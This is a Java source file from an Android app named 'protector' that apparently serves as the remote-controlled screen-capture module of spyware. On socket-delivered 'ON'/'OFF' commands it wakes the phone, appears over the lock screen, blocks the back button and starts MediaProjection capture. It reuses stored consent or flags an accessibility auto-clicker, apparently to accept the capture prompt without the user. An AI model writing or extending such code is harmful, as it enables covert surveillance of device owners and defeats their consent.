package com.icontrol.protector;

import static androidx.activity.result.ActivityResultCallerKt.registerForActivityResult;
import static com.icontrol.protector.Consts.Stored_intentdata;
import static com.icontrol.protector.Consts.Stored_resultCode;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.media.projection.MediaProjectionConfig;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.View;
import android.view.WindowManager;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import java.util.regex.Pattern;

public class ActivityCaptureScreen extends Activity {
    private static final int REQUEST_CODE = 100;
    private static int Quality = 70;
    private static String Sockid = "null";
    private String Commands[] = null;

    @Override
    public void onBackPressed() {

        return;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
//            getWindow().getDecorView().setSystemUiVisibility(
//                    View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
            // Turn screen on and show even if locked
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                setShowWhenLocked(true);
                setTurnScreenOn(true);
            }
            getWindow().addFlags(
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            );
            // Optional: dismiss keyguard
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
//                keyguardManager.requestDismissKeyguard(this, null);
//            } else {
//                getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
//            }

            // Optional: full screen
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);


            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                PowerManager.WakeLock wakeLock = pm.newWakeLock(
                        PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE,
                        "App:IncomingCall"
                );
                wakeLock.acquire(3000);
            }


        } catch (Exception a) {
            a.printStackTrace();
        }

        Intent inte = getIntent();

        try {
            Commands = inte.getStringExtra("COM").trim().split(Pattern.quote(Consts.SPLIT_SKT));
        } catch (Exception s) {
            Commands = null;
        }
        if (Commands == null) {
            finish();
            return;
        }
        Handler hstop = new Handler(Looper.getMainLooper());
        hstop.postDelayed(new Runnable() {
            public void run() {
                try {
                    switch (Commands[0]) {
                        case "ON":
                            Quality = Integer.valueOf(Commands[1]);
                            Sockid = Commands[2];

                            //MyLoger.Debug("Stored_resultCode:",String.valueOf(Stored_resultCode));
                            //MyLoger.Debug("Stored_intentdata:",String.valueOf(Stored_intentdata));

                            if (Stored_intentdata != null &&
                                    Stored_resultCode != -999 &&
                                    Build.VERSION.SDK_INT < 34) {

                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    startForegroundService(ScreenCaps.getStartIntent(getApplicationContext(), Stored_resultCode, Stored_intentdata, Quality, Sockid));
                                } else {
                                    startService(ScreenCaps.getStartIntent(getApplicationContext(), Stored_resultCode, Stored_intentdata, Quality, Sockid));
                                }
                                finish();
                                return;
                            } else {

                                startCatpure();
                                //  MySettings.WriteBool(getApplicationContext(),Consts.Auto_Clicker,true);
                                AccessServices.Auto_Click = true;
//                    if (Build.VERSION.SDK_INT >= 34){
//                        MySettings.WriteBool(getApplicationContext(),Consts.Auto_Sreen,true);
//                    }
                            }

                            break;
                        case "OFF":
                            StopCatpure();
                            finish();
                            break;

                    }
                } catch (Exception d) {

                }
            }
        }, 1100);

    }
//    private ActivityResultLauncher<Intent> screenCaptureLauncher = registerForActivityResult(
//            new ActivityResultContracts.StartActivityForResult(),
//            result -> {
//                if (result.getResultCode() == Activity.RESULT_OK) {
//                    Intent data = result.getData();
//                    // Start media projection with the obtained data
//                   // MySettings.WriteBool(getApplicationContext(), Consts.Auto_Sreen, false);
//                    //MySettings.WriteBool(getApplicationContext(),Consts.Auto_Clicker,false);
//                    AccessServices.Auto_Click = false;
//                    Stored_intentdata = data;
//                    Stored_resultCode = result.getResultCode();
//                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                        startForegroundService(ScreenCaps.getStartIntent(getApplicationContext(), result.getResultCode(), data, Quality, Sockid));
//                    }else{
//                        startService(ScreenCaps.getStartIntent(getApplicationContext(), result.getResultCode(), data, Quality, Sockid));
//                    }
//
//                    this.finish();
//                } else {
//                    // Handle cancellation or failure
//                }
//            }
//    );

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE) {

            if (resultCode == Activity.RESULT_OK) {
                //MySettings.WriteBool(getApplicationContext(), Consts.Auto_Sreen, false);
                //MySettings.WriteBool(getApplicationContext(),Consts.Auto_Clicker,false);
                AccessServices.Auto_Click = false;
                Stored_intentdata = data;
                Stored_resultCode = resultCode;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(ScreenCaps.getStartIntent(getApplicationContext(), resultCode, data, Quality, Sockid));
                } else {
                    startService(ScreenCaps.getStartIntent(getApplicationContext(), resultCode, data, Quality, Sockid));
                }

                this.finish();
            }
        }
    }


    private void startCatpure() {


        MediaProjectionManager mProjectionManager =
                (MediaProjectionManager) getApplicationContext().getSystemService(Context.MEDIA_PROJECTION_SERVICE);
//        if(Build.VERSION.SDK_INT >= 34){
//
//            screenCaptureLauncher.launch(mProjectionManager.createScreenCaptureIntent(MediaProjectionConfig.createConfigForDefaultDisplay()));
//        } else
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startActivityForResult(mProjectionManager.createScreenCaptureIntent(MediaProjectionConfig.createConfigForDefaultDisplay()), REQUEST_CODE);
        } else {
            startActivityForResult(mProjectionManager.createScreenCaptureIntent(), REQUEST_CODE);
        }


    }

    private void StopCatpure() {
        startService(ScreenCaps.getStopIntent(getApplicationContext()));
    }
}
